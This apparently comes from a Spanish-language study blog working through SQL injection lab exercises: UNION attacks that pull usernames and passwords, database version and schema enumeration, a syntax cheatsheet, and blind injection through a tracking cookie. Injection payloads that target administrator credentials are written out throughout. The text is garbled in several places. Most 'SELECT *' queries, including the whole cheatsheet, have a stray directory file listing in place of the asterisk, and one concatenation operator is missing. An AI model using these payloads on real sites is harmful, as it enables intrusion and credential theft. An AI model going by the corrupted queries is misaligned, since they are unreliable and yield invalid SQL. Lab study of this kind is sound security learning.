+	<img src="/assets/img/Burp/Pasted%20image%2020220308085509.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<p><strong>Uso de una inyección UNION SQL para extraer datos interesantes</strong></p>
+
+<p>Supuesto que queramos hacer una inyección SQL a través de una segunda búsqueda con UNION, después de haber averiguado cuántas columnas necesitamos y qué columnas pueden contener un tipo de datos interesante procedemos a extraer información.</p>
+
+<p>Para ello, necesitamos saber el nombre de la tabla de la que queremos extraer información y el nombre de las columnas que contienen datos que queramos extraer.</p>
+
+<p>Por ejemplo; supuesto una base de datos que contiene una tabla ‘users’ que se corresponde con un sitio web cuya búsqueda principal devuelve dos columnas y sabiendo que las columnas que nos interesa extraer de la tabla users son: ‘username’ y ‘password’ tenemos que:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' UNION SELECT username,password FROM users--
+</span></code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 5: SQL injection UNION attack, retrieving data from other tables</strong>.</p>
+
+<p>Estamos ante un sitio web y tenemos inteción de hacer un SQLi con UNION, debemos por tanto recopilar la siguiente información:</p>
+
+<ul>
+  <li>el número de columnas a hacer en la segunda query.</li>
+</ul>
+
+<p>Rápidamente, según el mecanismo de ORDER BY, podemos ver que contiene 2 columnas:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220309095126.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220309100849.png" text-align="center" />
+</div>
+
+<p>Recordamos, como aparece un error después de</p>
+<ul>
+  <li>el tipo de dato que puede mostrar cada columna.</li>
+</ul>
+
+<p>Observamos que ambas columnas pueden devolver cadenas de caracteres:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220309100050.png" text-align="center" />
+</div>
+<p><br /></p>
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220309100117.png" text-align="center" />
+</div>
+
+<p>De esta manera, podemos entonces pedir dos datos tipo string de otra tabla de la base de datos. Haciendo OSINT podemos llegar a descubrir que existe una tabla ‘users’ con columnas ‘username’ y ‘password’ que evidentemente contienen las credenciales de aquellos que pueden logearse en la base de datos.</p>
+
+<p>Así, perpetramos el ataque aprovechándonos de la información recolectada:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220309093517.png" text-align="center" />
+</div>
+
+<p>Y entre las credenciales obtenidas hemos conseguido las del administrador, así, seleccionando el botón de la derecha, ‘My account’ tenemos que podemos logearnos con la cuenta del mismo:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220309093721.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<p><strong>Extrayendo múltiples valores dentro de una sola columna</strong></p>
+
+<p>Supongámos ahora del ejemplo anterior que la primera búsqueda tan sólo devuelve una columna.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Podemos extraer varios valores de esa columna concatenándolos con el operador apropiado. Por ejemplo el operador</td>
+      <td> </td>
+      <td>que conecta cadenas de caracteres en SQL.</td>
+    </tr>
+  </tbody>
+</table>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220309220007.png" text-align="center" />
+</div>
+
+<p>Puede ser utilizado para concatenar datos en el ataque del laboratorio anterior con la siguiente query:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' UNION SELECT username || '</span><span class="o">~</span><span class="s1">' || password FROM users--
+</span></code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 6: SQL injection UNION attack, retrieving multiple values in a single column</strong>.</p>
+
+<p>Vamos a aplicar el mecanismo visto en esta sección sobre el contexto del laboratorio 5.</p>
+
+<p>En primer lugar, para estructurar adecuadamente la sintaxis del comando intentamos verificar el número de columnas y los datos que admiten:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220309223912.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220309224023.png" text-align="center" />
+</div>
+
+<p>Tiene dos columnas.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220309224209.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220309224224.png" text-align="center" />
+</div>
+
+<p>Sin embargo, pese a tener dos columnas, la única que admite un tipo de dato que nos permite extraer información.</p>
+
+<p>De esta forma, y en base a la sección anterior, la estructura de la query debe ser:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' UNION SELECT null,username || '</span><span class="o">~</span><span class="s1">' || password FROM users--
+</span></code></pre></div></div>
+
+<p>Que codificado en la URL adecuadamente quedaría como:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220309225123.png" text-align="center" />
+</div>
+
+<p>Y comprobamos las contraseñas:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220309225236.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<h4 id="24-examinando-la-base-de-datos">2.4. Examinando la base de datos.</h4>
+
+<p>Cuando estamos llevando a cabo un proceso de explotación a menudo es necesario recopilar información sobre la base de datos con la que se está trabajando. Esto incluye:</p>
+
+<ul>
+  <li>El tipo y versión de BDD.</li>
+  <li>Tablas, columnas y sus contenidos.</li>
+</ul>
+
+<p><br /></p>
+
+<h5 id="242-querys-para-determinar-la-version-y-el-tipo">2.4.2. Querys para determinar la version y el tipo.</h5>
+
+<p>Diferentes bases de datos proveen diferentes comandos para obtener su versión. A menudo se necesitan varios intentos para encontrar al menos una query valida.</p>
+
+<p>Algunos de los comandos para las bases de datos más populares son:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>BDD</th>
+      <th>Query</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Microsoft, MySQL</td>
+      <td>SELECT @@version</td>
+    </tr>
+    <tr>
+      <td>Oracle</td>
+      <td>SELECT Apuntes apuntesHechos Burp Desktop Documents Downloads file1.txt file.txt Music Pictures Public scriptApuntes.sh SQLInjection.md Templates Videos FROM v$version</td>
+    </tr>
+    <tr>
+      <td>PostgreSQL</td>
+      <td>SELECT version ()</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>De esta forma, si estuviéramos implementando un ataque SQLi enlazando dos querys con UNION emplearíamos la siguiente sintaxis:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' UNION SELECT @@version--
+</span></code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 7: SQL injection attack, querying the database type and version on Oracle</strong>.</p>
+
+<p>De nuevo, tenemos una base de datos vulnerable a un ataque de inyección SQL con el que pretendemos obtener el tipo y la versión de la base de datos que estamos atacando.</p>
+
+<p>Para dicha finalidad vamos a seguir los procedimientos establecidos hasta ahora, vamos a ver, supuesto que la web sea vulnerable, cuántas columnas conforman la búsqueda y qué tipo de dato devuelve cada columna.</p>
+
+<p>Terminamos concluyendo que la búsqueda devuelve dos columnas y, dato importante, como en el enunciado se explica que se trata de una base de datos de Oracle hace falta introducir el statement FROM y una tabla para que el enlace UNION sea sintácticamente válido tal y como comentábamos en la última parte del apartado 2.3.2 (Notas del método NULL).</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220310201304.png" text-align="center" />
+</div>
+
+<p>De forma que ambas columnas devuelven datos de tipo string.</p>
+
+<p>Así, buscamos información de la tabla V$VERSION de Oracle y encontramos que tiene 4 columnas:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220310204047.png" text-align="center" />
+</div>
+
+<p>Así, introducimos la query adecuada y codificada apropiadamente obteniendo:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220310204257.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 8: SQL injection attack, querying the database type and version on MySQL and Microsoft</strong></p>
+
+<p>En este caso, se nos informa que la tarea es la misma que en el laboratorio anterior, pero la base de datos es de tipo MySQL y Microsoft.</p>
+
+<p>Así, buscamos cuántas columnas son necesarias y qué columna puede devolvernos el resultado. Concluimos que tiene dos columnas</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220310205148.png" text-align="center" />
+</div>
+
+<p>y que ambas columnas devuelven strings.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220310205441.png" text-align="center" />
+</div>
+
+<p>Es importante tener en cuenta un inciso, en este caso no es necesario añadir la tabla donde se realiza la query como ocurría con la BDD de Oracle, sin embargo, se tiene que, al tratarse MySQL, hay que dejar un espacio después del doble guión para que tal término se interprete como un inicio de comentario, con lo que después de – se añade un + en la URL (espacio codificado).</p>
+
+<p>Por último acudiendo a la tabla anterior y teniendo en cuenta la sintaxis:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220310231713.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<h5 id="243-listando-el-contenido-de-una-base-de-datos-no-perteneciente-a-oracle">2.4.3. Listando el contenido de una base de datos no perteneciente a Oracle.</h5>
+
+<p>Muchos tipos de base de datos, con la notable excepción de Oracle, tienen un conjunto de esquemas informativos que proveen información de la base de datos: <strong>information_schema.tables</strong></p>
+
+<p>De esta forma podemos realizar la siguiente query:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">Apuntes</span> <span class="n">apuntesHechos</span> <span class="n">Burp</span> <span class="n">Desktop</span> <span class="n">Documents</span> <span class="n">Downloads</span> <span class="n">file1</span><span class="p">.</span><span class="n">txt</span> <span class="n">file</span><span class="p">.</span><span class="n">txt</span> <span class="n">Music</span> <span class="n">Pictures</span> <span class="k">Public</span> <span class="n">scriptApuntes</span><span class="p">.</span><span class="n">sh</span> <span class="n">SQLInjection</span><span class="p">.</span><span class="n">md</span> <span class="n">Templates</span> <span class="n">Videos</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span>
+</code></pre></div></div>
+
+<p>Debería de devolver una tabla como la siguiente:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220311095440.png" text-align="center" />
+</div>
+
+<p>Ahí se puede ver, siguiendo los campos de cada tabla, que hay tres tablas.</p>
+
+<p><br /></p>
+
+<p>Con <strong>information_schema.columns</strong> para listar las columnas en una tabla:</p>
+
+<p>Con la query:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">Apuntes</span> <span class="n">apuntesHechos</span> <span class="n">Burp</span> <span class="n">Desktop</span> <span class="n">Documents</span> <span class="n">Downloads</span> <span class="n">file1</span><span class="p">.</span><span class="n">txt</span> <span class="n">file</span><span class="p">.</span><span class="n">txt</span> <span class="n">Music</span> <span class="n">Pictures</span> <span class="k">Public</span> <span class="n">scriptApuntes</span><span class="p">.</span><span class="n">sh</span> <span class="n">SQLInjection</span><span class="p">.</span><span class="n">md</span> <span class="n">Templates</span> <span class="n">Videos</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">WHERE</span> <span class="k">table_name</span> <span class="o">=</span> <span class="s1">'Users'</span>
+</code></pre></div></div>
+
+<p>devolviendo:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220311100232.png" text-align="center" />
+</div>
+
+<p>Enseñando de esta forma las columnas de la tabla Users.</p>
+
+<p>Este es el procedimiento que utilizan algunas herramientas de automatización de inyección de código SQL como sql map.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 9: SQL injection attack, listing the database contents on non-Oracle databases</strong></p>
+
+<p>En este caso tenemos una aplicación que contiene una vulnerabilidad de SQLi en el parámetro ‘product’ y ‘category’. Los resultados de la búsqueda se devuelven por pantalla.</p>
+
+<p>Aplicando lo visto anteriormente, conseguir logearse como el administrador.</p>
+
+<p>Accedemos al laboratorio y testeamos el número de columnas que devuelve la búsqueda así como el tipo de dato, con el método NULL sobre el parámetro ‘category’ obtenemos que tiene dos columnas:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220311103039.png" text-align="center" />
+</div>
+
+<p>Y sustituyendo los null por cadenas de caracteres vemos que además ambas devuelven strings:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220311103121.png" text-align="center" />
+</div>
+
+<p>Así, en definitiva, sólo podemos extraer dos columnas de las búsquedas que hagamos sobre los esquemas de información contenidos en la base de datos:</p>
+
+<p>Echándo un vistazo sobre las columnas en los ejemplos anteriores observamos que nos conviene acceder a la columna TABLE_NAME de information_schema.tables y con TABLE_NAME , COLUMN_NAME de information_schema.columns una vez se ha seleccionado una tabla concreta.</p>
+
+<ul>
+  <li>Así, en primer lugar vemos cuántas tablas hay en la BDD:</li>
+</ul>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220311103945.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220311104135.png" text-align="center" />
+</div>
+
+<p>Apareciendo una amplia lista.</p>
+
+<p><br /></p>
+
+<ul>
+  <li>De la lista de tablas disponibles, empleamos el information_schema.columns para tener acceso a los datos de las mismas para encontrar la contraseña del usuario ‘administrator’:</li>
+</ul>
+
+<p>En la tabla anterior podemos ver que existe una tabla denominada ‘pg_auth_members’,. Así, nos referimos a information_schema.columns para saber qué columnas tiene:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220311105656.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220311112022.png" text-align="center" />
+</div>
+
+<p>Y empleando el buscador del navegador (Ctrl+F) para encontrar todo lo relacionado con el término ‘user’ y obtenemos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220311110637.png" text-align="center" />
+</div>
+
+<p>Buscándo el contenidod e esa columna en otra query encontramos:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220311110727.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220311110735.png" text-align="center" />
+</div>
+
+<p>Y finalmente probando con la segunda contraseña obteniendo:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220311111024.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<h5 id="244-listando-los-contenidos-de-una-base-de-datos-perteneciente-a-oracle">2.4.4 Listando los contenidos de una base de datos perteneciente a Oracle.</h5>
+
+<p>En Oracle se puede obtener la misma información con querys distintas ya que las tablas de información tienen una formulación diferente.</p>
+
+<p>Por ejemplo, para obtener todas las tablas utilizamos ‘all_tables’ de la siguiente manera:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">Apuntes</span> <span class="n">apuntesHechos</span> <span class="n">Burp</span> <span class="n">Desktop</span> <span class="n">Documents</span> <span class="n">Downloads</span> <span class="n">file1</span><span class="p">.</span><span class="n">txt</span> <span class="n">file</span><span class="p">.</span><span class="n">txt</span> <span class="n">Music</span> <span class="n">Pictures</span> <span class="k">Public</span> <span class="n">scriptApuntes</span><span class="p">.</span><span class="n">sh</span> <span class="n">SQLInjection</span><span class="p">.</span><span class="n">md</span> <span class="n">Templates</span> <span class="n">Videos</span> <span class="k">FROM</span> <span class="n">all_tables</span>
+</code></pre></div></div>
+
+<p>Y dada una tabla, puedes listar sus columnas con ‘all_tab_columns’ aplicándola en la siguiente query de ejemplo:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">Apuntes</span> <span class="n">apuntesHechos</span> <span class="n">Burp</span> <span class="n">Desktop</span> <span class="n">Documents</span> <span class="n">Downloads</span> <span class="n">file1</span><span class="p">.</span><span class="n">txt</span> <span class="n">file</span><span class="p">.</span><span class="n">txt</span> <span class="n">Music</span> <span class="n">Pictures</span> <span class="k">Public</span> <span class="n">scriptApuntes</span><span class="p">.</span><span class="n">sh</span> <span class="n">SQLInjection</span><span class="p">.</span><span class="n">md</span> <span class="n">Templates</span> <span class="n">Videos</span> <span class="k">FROM</span> <span class="n">all_tab_columns</span> <span class="k">WHERE</span> <span class="k">table_name</span> <span class="o">=</span> <span class="s1">'USERS'</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 10: SQL injection attack, listing the database contents on Oracle</strong></p>
+
+<p>Este laboratorio contiene una vulnerabilidad SQLi en los parámetros ‘category’ y ‘product’. EL objetivo es listar todos los usuarios y contraseñas para conseguir logearte como el adminstrador.</p>
+
+<p>De nuevo, obtenemos que debemos buscar cuántas columnas realiza la primera búsqueda y qué datos devuelve cada columna:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220311115248.png" text-align="center" />
+</div>
+
+<p>Tiene dos columnas y devuelven ambas datos de tipo string. Importante notar de nuevo que como se trata de una base de datos de Oracle hace falta introducir una tabla de la que extraer datos para que la query sea sintácticamente válida.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220311115616.png" text-align="center" />
+</div>
+
+<p>A partir de aquí sólo podemos extraer dos columnas por búsqueda. Buscamos información sobre el contenido de la tabla all_tab_columns</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220311120103.png" text-align="center" />
+</div>
+
+<p>Y decidimos extraer la información de las columnas TABLE_NAME, COLUMN_NAME.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220311120429.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220311120453.png" text-align="center" />
+</div>
+
+<p>Así, utilizamos el buscador del navegador para filtrar por términos como password, users, etc.</p>
+
+<p>Filtrando por el término USER finalmente llegamos a:ç</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220311170138.png" text-align="center" />
+</div>
+
+<p>de forma que:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220311170255.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220311170309.png" text-align="center" />
+</div>
+
+<p>Así, terminamos el laboratorio probando las credenciales del administrador:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220311170351.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<h4 id="25-cheatsheet-sqli">2.5. CheatSheet SQLi.</h4>
+
+<p>Veamos ahora un resumen de sintaxis útil de todo lo que hemos visto hasta ahora:</p>
+
+<p><br /></p>
+
+<h5 id="251-concatenación-de-strings">2.5.1. Concatenación de Strings.</h5>
+
+<p>Dependiendo de la base de datos puedes concatenar cadenas de caracteres de las siguientes formas:</p>
+
+<ul>
+  <li>
+    <p><strong>Oracle</strong>: ‘Str1’ || ‘Str2’</p>
+  </li>
+  <li>
+    <p><strong>Microsoft</strong>: ‘Str1’+’Str2’</p>
+  </li>
+  <li>
+    <p><strong>PostgreSQL</strong>: ‘Str1’ || ‘Str2’</p>
+  </li>
+  <li>
+    <p><strong>MySQL</strong>: ‘Str1’ [ESPACIO] ‘Str2’ (o CONCAT(‘Str1’,’Str2’))</p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<h5 id="252-comentarios">2.5.2. Comentarios.</h5>
+
+<ul>
+  <li>
+    <p><strong>Oracle</strong>: –comment</p>
+  </li>
+  <li>
+    <p><strong>Microsoft</strong>: –comment o /*comment*/</p>
+  </li>
+  <li>
+    <p><strong>PostgreSQL</strong>: –comment o /*comment*/</p>
+  </li>
+  <li>
+    <p><strong>MySQL</strong>: #comment o – comment [Note the space after the double dash] o /*comment*/</p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<h5 id="253-versión-de-la-base-de-datos">2.5.3. Versión de la base de datos.</h5>
+<ul>
+  <li>
+    <p><strong>Oracle</strong>:
+SELECT banner FROM v$version
+SELECT version FROM v$instance</p>
+  </li>
+  <li>
+    <p><strong>Microsoft</strong>: SELECT @@version</p>
+  </li>
+  <li>
+    <p><strong>PostgreSQL</strong>: SELECT version()</p>
+  </li>
+  <li>
+    <p><strong>MySQL</strong>: SELECT @@version</p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<h5 id="254-contenidos-de-la-base-de-datos">2.5.4. Contenidos de la base de datos.</h5>
+
+<ul>
+  <li><strong>Oracle</strong>:</li>
+</ul>
+
+<p>SELECT Apuntes apuntesHechos Burp Desktop Documents Downloads file1.txt file.txt Music Pictures Public scriptApuntes.sh SQLInjection.md Templates Videos FROM all_tables</p>
+
+<p>SELECT Apuntes apuntesHechos Burp Desktop Documents Downloads file1.txt file.txt Music Pictures Public scriptApuntes.sh SQLInjection.md Templates Videos FROM all_tab_columns WHERE table_name = ‘TABLE-NAME-HERE’`</p>
+
+<ul>
+  <li><strong>Microsoft</strong>:</li>
+</ul>
+
+<p>SELECT Apuntes apuntesHechos Burp Desktop Documents Downloads file1.txt file.txt Music Pictures Public scriptApuntes.sh SQLInjection.md Templates Videos FROM information_schema.tables</p>
+
+<p>SELECT Apuntes apuntesHechos Burp Desktop Documents Downloads file1.txt file.txt Music Pictures Public scriptApuntes.sh SQLInjection.md Templates Videos FROM information_schema.columns WHERE table_name = ‘TABLE-NAME-HERE’</p>
+
+<ul>
+  <li><strong>PostgreSQL</strong></li>
+</ul>
+
+<p>SELECT Apuntes apuntesHechos Burp Desktop Documents Downloads file1.txt file.txt Music Pictures Public scriptApuntes.sh SQLInjection.md Templates Videos FROM information_schema.tables</p>
+
+<p>SELECT Apuntes apuntesHechos Burp Desktop Documents Downloads file1.txt file.txt Music Pictures Public scriptApuntes.sh SQLInjection.md Templates Videos FROM information_schema.columns WHERE table_name = ‘TABLE-NAME-HERE’</p>
+
+<ul>
+  <li><strong>MySQL</strong>:</li>
+</ul>
+
+<p>SELECT Apuntes apuntesHechos Burp Desktop Documents Downloads file1.txt file.txt Music Pictures Public scriptApuntes.sh SQLInjection.md Templates Videos FROM information_schema.tables</p>
+
+<p>SELECT Apuntes apuntesHechos Burp Desktop Documents Downloads file1.txt file.txt Music Pictures Public scriptApuntes.sh SQLInjection.md Templates Videos FROM information_schema.columns WHERE table_name = ‘TABLE-NAME-HERE’</p>
+
+<p><br /></p>
+
+<h5 id="255-substring">2.5.5. Substring.</h5>
+
+<p>Se denomina <strong>Substring</strong> a una parte de un String, es decir, a un subconjunto de caracteres pertenecientes a una cadena de caracteres.</p>
+
+<p>En SQL, existen diversas funciones para extraer subcadenas, en función del tipo de base de datos, tenemos:</p>
+
+<ul>
+  <li>
+    <p><strong>Oracle</strong>: SUBSTR(‘foobar’, 4, 2)</p>
+  </li>
+  <li>
+    <p><strong>Microsoft</strong>: SUBSTRING(‘foobar’, 4, 2)</p>
+  </li>
+  <li>
+    <p><strong>PostgreSQL</strong>: SUBSTRING(‘foobar’, 4, 2)</p>
+  </li>
+  <li>
+    <p><strong>MySQL</strong>: SUBSTRING(‘foobar’, 4, 2)</p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<h4 id="3-blind-sql-injection">3. Blind SQL Injection.</h4>
+
+<h5 id="31-qué-es-una-inyección-de-código-ciega">3.1. ¿Qué es una inyección de código ciega?</h5>
+
+<p>La inyección SQL ciega surge cuando una aplicación vulnerable a la inyección SQL no devuelve contenido relevante de dichas búsquedas en sus respuestas HTTP.</p>
+
+<p>De esta forma, cuando estamos ante este tipo de aplicaciones las técnicas convenicionales como el UNION no funcionan ya que la eficacia de estas descansan fundamentalmente sobre los datos que devuelven a través de la respuesta HTTP.</p>
+
+<p>Muchas instancias de SQLInjection contienen vulnerabilidades ciegas. Aún así, pueden ser explotadas pero las técnicas a utilizar generalmente son más complicadas.</p>
+
+<p><br /></p>
+
+<h5 id="32-explotando-una-vulnerabilidad-sql-ciega-provocando-respuestas-condicionales">3.2. Explotando una vulnerabilidad SQL ciega provocando respuestas condicionales.</h5>
+
+<p>Consideremos una aplicación que utiliza cookies de rastreo para recolectar analíticas de uso. De esta fora, cuando un usuario realiza una request a la aplicación, siempre le traslada una cookie: ‘TrackingID’. Así, la cookie es procesada por la aplicación mediante una query:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">TrackinID</span> <span class="k">FROM</span> <span class="n">TrackedUsers</span> <span class="k">WHERE</span> <span class="n">TrackingId</span> <span class="o">=</span> <span class="s1">'u5YD3PapBcR41N3e7Tj4'</span>
+</code></pre></div></div>
+
+<p>Evaluando esta situación podemos comprobar que, por un lado, esta query es vulnerable a SQLi pero por otra parte evidentemente no se devuelve un resultado al usuario, es un ejemplo de una vulnerabilidad ciega de SQLi.</p>
+
+<p>El único dato que devuelve es un mensaje “Welcome Back” si una cookie reconocida es enviada a la aplicación. Este pequeño detalle es suficiente para que podamos explotar la vulnerabilidad provocando respuestas condicionales.</p>
+
+<p>Para ver cómo funcionan, supongámos dos request a la aplicación que contienen ambas la cookie TrackingID.</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span><span class="n">xyz</span><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>
+<span class="p">...</span><span class="n">xyz</span><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">2</span>
+</code></pre></div></div>
+
+<p>La diferencia entre ambas es que una es correcta y se procesa satisfactoriamente produciendo el mencionado “Welcome Back” gracias a la identificación de TranckingID y la segunda es falsa y como tal no se procesa con lo que no se devuelve este mensaje.</p>
+
+<p>Este mecanismo puede extrapolarse a la hora de indagar dentro de la base de datos. Si la query inyectada contiene alguna sección que no puede llevarse a cabo, no se desplegará el mensaje y si se ha procesado correctamente se desplegará dicho mensaje.</p>
+
+<p>Por ejemplo, supongámos que estamos ante una base de datos de la cual conocemos la existencia de una tabla, ‘Users’, de las columnas ‘username’, ‘password’ y de un elemento de la columna ‘username’; administrator.</p>
+
+<p>Podemos emplear el mecanismo anterior para crear inyecciones SQL condicionales y obtener la contraseña del administrador probando caracteres uno a uno con la siguiente query:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND SUBSTRING((SELECT Password FROM Users WHERE Username = '</span><span class="n">Administrator</span><span class="s1">'), 1, 1) &gt; '</span><span class="n">m</span>
+</code></pre></div></div>
+
+<p>Es decir obtenemos, del string ‘password’ asociado a ‘administrator’ de la tabla ‘Users’ el substring desde el caracter 1 al caracter 1 (es decir, que cogemos la primera letra de la contraseña) y comprobamos si está por encima de la letra m en el diccionario.</p>
+
+<p>Otro ejemplo sería:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' AND SUBSTRING((SELECT Password FROM Users WHERE Username = '</span><span class="n">Administrator</span><span class="s1">'), 1, 1) ='</span><span class="n">s</span>
+</code></pre></div></div>
+
+<p>En la que hacemos lo mismo solamente que en esta ocasión cogemos el primer caracter y lo cotejamos con el caracter ‘s’.</p>
+
+<p>* Mencionar que la funcion SUBSTRING puede cambiar en función del tipo de base de datos.</p>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 11: Blind SQL injection with conditional responses</strong>.</p>
+
+<p>Este laboratorio contiene una vulnerabilidad SQL ciega. La aplicación utiliza una cookie de rastreo que incorpora en las querys SQL que se realizan.</p>
+
+<p>Los resultados de dicha query no se devuelven ni tampoco se muestran mensajes de error aunque la aplicación incluye un mensaje “Welcome back” en la página.</p>
+
+<p>La base de datos contiene una tabla diferente llamada ‘users’ con dos columnas: ‘username’, ‘password’. El laboratorio se completa logeándote como el administrador.</p>
+
+<p>En primer lugar, para comprobar la existencia de la vulnerabilidad.</p>
+
+<p>Cuando nos metemos por primera vez en la aplicación aparece una página como la que hemos visto en otras ocasiones, pero cuando refrescamos la página se identifica nuestra cookie TrackingID tal y como se menciona en el enunciado y aparece un mensaje en la esquina superior derecha:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220313165826.png" text-align="center" />
+</div>
+
+<p>Esa es la señal de la identificación de la cookie y de una correcta query en la base de datos.</p>
+
+<p>Verifiquemos que esto es así. Abrimos ‘Inspeccionar Elemento’ en Firefox y seleccionamos la pestaña ‘Storage’. Ahí aparecen las cookies que se envían junto con la request. De esta forma, modificamos el campo ‘Value’ de la cookie TrackingID y añadimos una conjunción lógica junto con una tautología:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220313171306.png" text-align="center" />
+</div>
+
+<p>Y al refrescar la página, el mensaje “Welcome Back!” vuelve a aparecer. Si ahora cambiamos la tautología por una contradicción, el mensaje desaparece con lo que la vulnerabilidad funciona adecuadamente:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220313171421.png" text-align="center" />
+</div>
+
